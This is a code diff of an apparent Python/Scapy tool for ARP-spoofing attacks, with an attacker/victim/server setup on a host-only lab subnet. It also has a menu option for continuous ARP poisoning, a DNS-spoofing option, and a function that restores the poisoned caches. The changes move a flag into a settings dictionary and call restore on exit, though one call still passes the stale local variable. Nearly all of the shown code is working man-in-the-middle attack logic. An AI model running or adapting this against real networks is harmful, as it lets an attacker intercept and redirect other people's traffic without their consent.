@@ -18,11 +18,9 @@ Net_Interface = "eth0"
 SERVER_IP = "192.168.56.102"
 SERVER_MAC = '08:00:27:CC:08:6F'
 ATTACKER_MAC = get_mac_address(interface=Net_Interface)
-duckforce = False # Continously ARP poison the victims in order to not let them restore the ARP Caches
+settings["duckforce"] = False # Continously ARP poison the victims in order to not let them restore the ARP Caches
 
 def start():
-
-	
 
 	def arp(VICTIM_MAC, VICTIM_IP, duckforce):
 		while True:
@@ -48,7 +46,9 @@ def start():
 
 			print("(Re-)poisoned the ARP of the following IPs: " + VICTIM_IP +" and "+ SERVER_IP)
 			time.sleep(20)
-    	
+    			
+			if settings["duckforce"] == False:
+			    break
 		return
 	
 
@@ -91,8 +91,8 @@ def start():
 		print("\nWould you like to rrepeadedly poison the ARP of the victim? (Y/N)\n")
 		choice = input()
 		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
-			duckforce = True
-		arp(VICTIM_MAC, VICTIM_IP, duckforce)
+			settings["duckforce"] = True
+		arp(VICTIM_MAC, VICTIM_IP, settings["duckforce"])
 	
 	elif attack_to_perform == "2":
 		dns()
@@ -106,7 +106,7 @@ def start():
 		print("\nWould you like to rrepeadedly poison the ARP of the victim? (Y/N)\n")
 		choice = input()
 		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
-			duckforce = True
+			settings["duckforce"] = True
 		arp(VICTIM_MAC, VICTIM_IP, duckforce)
 		#Do dns() shit
 
@@ -115,6 +115,8 @@ def start():
 		return
 		
 def restore_arp(VICTIM_MAC, VICTIM_IP):
+		
+		# Restore the ARP cache of the Victim
 		arp = Ether() / ARP()
 		arp[Ether].src = ATTACKER_MAC
 		arp[Ether].dst = SERVER_MAC
@@ -124,7 +126,7 @@ def restore_arp(VICTIM_MAC, VICTIM_IP):
 		arp[ARP].pdst = SERVER_IP
 		sendp(arp, iface=Net_Interface)
         
-       	 #Restore the ARP cache of the server
+        	# Restore the ARP cache of the Server
 		arp = Ether() / ARP()
 		arp[Ether].src = ATTACKER_MAC
 		arp[Ether].dst = VICTIM_MAC
@@ -139,9 +141,12 @@ def restore_arp(VICTIM_MAC, VICTIM_IP):
 if __name__ == '__main__':
 	try:
 		start()
+		if settings["restore_arp_choice"]:
+                    print("Restoring ARP caches of the infected Victims...")
+                    restore_arp(settings["VICTIM_MAC"], settings['VICTIM_IP'])
+			
 	except KeyboardInterrupt:
         	print('Exiting program ...')
         	if settings["restore_arp_choice"]:
                     print("Restoring ARP caches of the infected Victims...")
-                    
                     restore_arp(settings["VICTIM_MAC"], settings['VICTIM_IP'])
